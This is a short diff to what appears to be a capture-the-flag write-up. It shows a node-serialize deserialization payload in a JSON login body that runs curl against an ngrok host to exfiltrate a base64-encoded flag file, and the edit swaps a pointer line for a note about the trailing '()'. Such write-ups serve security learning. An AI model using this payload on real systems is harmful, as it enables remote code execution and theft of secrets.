@@ -23,9 +23,8 @@ But to prevent it get execute from our machine other than victim machine, we add
 **edited to get the flag**:
 ```json
 {"userName":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://d657-1-55-197-127.ngrok.io?c=`cat flag/secret | base64`', function(error, stdout, stderr) { console.log(stdout) });\n }()","passWord":"hello"}
-//					                                                      ^^
 ```
-
+Notice `()` at the end of the function
 
 **base64 encoded**:
 ```
